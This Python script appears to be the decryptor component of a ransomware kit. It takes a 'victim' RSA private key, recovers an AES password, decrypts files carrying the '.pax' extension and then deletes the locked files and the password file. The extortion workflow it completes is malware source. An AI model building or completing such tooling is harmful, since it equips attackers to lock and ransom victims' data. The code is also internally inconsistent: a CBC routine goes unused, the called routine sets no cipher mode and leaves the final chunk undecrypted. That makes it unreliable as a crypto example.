import os
import rsa
from Crypto.Cipher import AES
import struct

DECRYPT_PRI_KEY_FILENAME="victim_private.PEM"

def AESDecrypt(password, chunksize=64*1024):
    extension='pax'
    files=os.listdir()
    decrypt_list = [file for file in files if file.endswith(extension)]
    for file in decrypt_list:
        with open(file, 'rb') as infile:
            origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
            iv = infile.read(16)
            aesDecryptor = AES.new(password, AES.MODE_CBC, iv)
            outfilename = file[:-(len(extension)+1)]
            with open(outfilename, 'wb') as outfile:
                while True:
                    chunk = infile.read(chunksize)
                    if len(chunk) == 0:
                        break
                    outfile.write(aesDecryptor.decrypt(chunk))
                outfile.truncate(origsize)

def AESDecryptEasy(password, chunksize=1024):
    extension='pax'
    files=os.listdir()
    decrypt_list = [file for file in files if file.endswith(extension)]
    for file in decrypt_list:
        with open(file, 'rb') as infile:
            aesDecryptor = AES.new(password)
            outfilename = file[:-(len(extension)+1)]
            with open(outfilename, 'wb') as outfile:
                while True:
                    chunk = infile.read(chunksize)
                    if len(chunk) < chunksize:
                        outfile.write(chunk)
                        break
                    outfile.write(aesDecryptor.decrypt(chunk))

def DecrpytVictimRSA(pri_key_bytes):
    pri_key = rsa.PrivateKey.load_pkcs1(pri_key_bytes)
    encryptedpass = ''
    with open('AESpassword.pass', 'rb') as aesfile:
        encryptedpass = aesfile.read()
    password = rsa.decrypt(encryptedpass, pri_key)
    return password

if __name__ == "__main__":
    print('''
        ############################################
        # **    ****  ****  ***  *   *  ***  *****
        # * *   *     *     *  *  * *   *  *   *
        # *  *  ****  *     **     *    ***    *
        # * *   *     *     * *    *    *      *
        # **    ****  ****  *  *   *    *      *
        ############################################

    ''')
    filename = input("Decrypted key Filename (Enter for '"+DECRYPT_PRI_KEY_FILENAME+"'): ")
    if filename == "":
        filename = DECRYPT_PRI_KEY_FILENAME
    pri_key_bytes=""
    with open(filename, 'rb') as decryptedkeyfile:
        pri_key_bytes = decryptedkeyfile.read()
    password = DecrpytVictimRSA(pri_key_bytes)
    AESDecryptEasy(password)
    [os.remove(filename) for filename in os.listdir() if filename.endswith(('pax','pass'))]

    


